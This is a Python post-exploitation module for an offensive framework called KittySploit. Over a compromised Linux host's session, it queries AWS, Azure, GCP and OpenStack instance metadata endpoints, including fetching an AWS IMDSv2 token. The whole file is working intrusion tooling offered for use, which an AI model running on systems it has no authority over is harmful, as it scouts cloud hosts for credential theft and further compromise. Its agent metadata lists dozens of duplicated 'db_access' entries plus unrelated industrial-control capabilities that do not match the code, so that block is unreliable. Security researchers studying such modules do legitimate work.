from kittysploit import *
from lib.post.linux.system import System
from lib.post.linux.session import LinuxSessionMixin
import json


class Module(Post, System, LinuxSessionMixin):
    __info__ = {
        "name": "Linux Cloud Metadata Check",
        "description": "Check if cloud instance metadata endpoints are reachable from target host",
        "platform": Platform.LINUX,
        "author": "KittySploit Team",
        "session_type": [SessionType.SHELL, SessionType.METERPRETER, SessionType.SSH],
    'agent': {
        'risk': 'intrusive',
        'effects': ['active_exploitation'],
        'expected_requests': 2,
        'reversible': False,
        'approval_required': True,
        'produces': ['risk_signals'],
        'cost': 1.5,
        'noise': 0.5,
        'value': 1.0,
        'requires':         {'min_endpoints': 0,
         'min_params': 0,
         'tech_hints_any': [],
         'tech_hints_all': [],
         'specializations_any': [],
         'risk_signals_any': [],
         'auth_session': False,
         'capabilities_any': [],
         'capabilities_all': [],
         'confidence_min': {},
         'confidence_min_any': {},
         'endpoint_pattern_any': [],
         'param_any': [],
         'api_surface_ready': False},
        'chain':         {'produces_capabilities': [{'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 's7comm', 'from_detail': ''},
                                   {'capability': 'ot_assets', 'from_detail': ''},
                                   {'capability': 'ot_assets', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''}],
         'consumes_capabilities': [],
         'option_bindings': {},
         'suggested_followups': []},
    },
    }

    timeout = OptInteger(2, "HTTP timeout in seconds", False)

    def _run_cmd(self, command: str) -> str:
        try:
            output = self.linux_execute(command)
            return output.strip() if output else ""
        except Exception:
            return ""

    def _print_section(self, title: str):
        print_status("=" * 60)
        print_status(title)
        print_status("=" * 60)

    def _find_python(self) -> str:
        for binary in ("python3", "python", "python2"):
            if self.command_exists(binary):
                return binary
        return ""

    def _resolve_http_client(self, timeout: int):
        if self.command_exists("curl"):
            return "curl", "curl -sS -m {t}".format(t=timeout)
        if self.command_exists("wget"):
            return "wget", "wget -q -T {t} -O -".format(t=timeout)
        python = self._find_python()
        if python:
            return "python", python
        return None, None

    def _python_fetch_cmd(self, python: str, url: str, headers: dict, timeout: int, max_bytes: int = 0) -> str:
        script = (
            "import urllib.request as u\n"
            "h={headers}\n"
            "r=u.Request({url!r}, headers=h)\n"
            "o=u.urlopen(r, timeout={timeout})\n"
            "d=o.read({max_bytes})\n"
            "print(d.decode('utf-8','replace').strip())"
        ).format(
            headers=json.dumps(headers),
            url=url,
            timeout=timeout,
            max_bytes=max_bytes if max_bytes > 0 else -1,
        )
        return "{py} -c {script!r}".format(py=python, script=script)

    def _python_put_cmd(self, python: str, url: str, headers: dict, timeout: int) -> str:
        script = (
            "import urllib.request as u\n"
            "h={headers}\n"
            "r=u.Request({url!r}, data=b'', method='PUT', headers=h)\n"
            "o=u.urlopen(r, timeout={timeout})\n"
            "print(o.read().decode('utf-8','replace').strip())"
        ).format(headers=json.dumps(headers), url=url, timeout=timeout)
        return "{py} -c {script!r}".format(py=python, script=script)

    def _fetch_url(self, client_type: str, client: str, timeout: int, url: str, headers: dict = None, max_bytes: int = 0) -> str:
        headers = headers or {}
        if client_type == "curl":
            cmd = client
            for key, value in headers.items():
                cmd += " -H {hdr!r}".format(hdr="{0}: {1}".format(key, value))
            cmd += " {url!r} 2>/dev/null".format(url=url)
            if max_bytes > 0:
                cmd += " | head -c {n}".format(n=max_bytes)
            else:
                cmd += " | head -n 1"
            return self._run_cmd(cmd)

        if client_type == "wget":
            cmd = client
            for key, value in headers.items():
                cmd += " --header={hdr!r}".format(hdr="{0}: {1}".format(key, value))
            cmd += " {url!r} 2>/dev/null".format(url=url)
            if max_bytes > 0:
                cmd += " | head -c {n}".format(n=max_bytes)
            else:
                cmd += " | head -n 1"
            return self._run_cmd(cmd)

        if client_type == "python":
            return self._run_cmd(self._python_fetch_cmd(client, url, headers, timeout, max_bytes))
        return ""

    def _fetch_aws_imdsv2_token(self, client_type: str, client: str, timeout: int) -> str:
        url = "http://169.254.169.254/latest/api/token"
        headers = {"X-aws-ec2-metadata-token-ttl-seconds": "21600"}
        if client_type == "curl":
            return self._run_cmd(
                "curl -sS -m {t} -X PUT {url} -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600' 2>/dev/null".format(
                    t=timeout, url=url
                )
            )
        if client_type == "wget":
            return self._run_cmd(
                "wget -q -T {t} --method=PUT --header='X-aws-ec2-metadata-token-ttl-seconds: 21600' -O - {url} 2>/dev/null".format(
                    t=timeout, url=url
                )
            )
        if client_type == "python":
            return self._run_cmd(self._python_put_cmd(client, url, headers, timeout))
        return ""

    def _check_endpoint(self, name: str, output: str) -> bool:
        if output:
            print_warning("{name}: reachable".format(name=name))
            print_info("  {output}".format(output=output))
            return True
        print_info("{name}: not reachable".format(name=name))
        return False

    def run(self):

        if not self.linux_require_linux():
            return False

        self._print_section("Cloud Metadata Reachability")
        timeout = int(self.timeout)

        client_type, client = self._resolve_http_client(timeout)
        if not client_type:
            print_error("No HTTP client available on target (curl, wget, or python)")
            return False

        if client_type == "python":
            print_info("Using python urllib fallback for metadata requests")
        else:
            print_info("Using {client_type} for metadata requests".format(client_type=client_type))

        findings = 0

        findings += int(
            self._check_endpoint(
                "AWS IMDSv1",
                self._fetch_url(
                    client_type,
                    client,
                    timeout,
                    "http://169.254.169.254/latest/meta-data/instance-id",
                ),
            )
        )

        token = self._fetch_aws_imdsv2_token(client_type, client, timeout)
        if token:
            output = self._fetch_url(
                client_type,
                client,
                timeout,
                "http://169.254.169.254/latest/meta-data/instance-id",
                headers={"X-aws-ec2-metadata-token": token.replace("'", "")},
            )
            if output:
                print_warning("AWS IMDSv2: reachable")
                print_info("  {output}".format(output=output))
                findings += 1
            else:
                print_info("AWS IMDSv2: token acquired but metadata query failed")
        else:
            print_info("AWS IMDSv2: not reachable or token endpoint blocked")

        findings += int(
            self._check_endpoint(
                "Azure IMDS",
                self._fetch_url(
                    client_type,
                    client,
                    timeout,
                    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
                    headers={"Metadata": "true"},
                    max_bytes=180,
                ),
            )
        )
        findings += int(
            self._check_endpoint(
                "GCP Metadata",
                self._fetch_url(
                    client_type,
                    client,
                    timeout,
                    "http://metadata.google.internal/computeMetadata/v1/instance/id",
                    headers={"Metadata-Flavor": "Google"},
                ),
            )
        )
        findings += int(
            self._check_endpoint(
                "OpenStack Metadata",
                self._fetch_url(
                    client_type,
                    client,
                    timeout,
                    "http://169.254.169.254/openstack/latest/meta_data.json",
                    max_bytes=180,
                ),
            )
        )

        self._print_section("Summary")
        if findings > 0:
            print_warning("Detected {n} reachable metadata endpoint(s)".format(n=findings))
        else:
            print_success("No known cloud metadata endpoint was reachable")
        return True
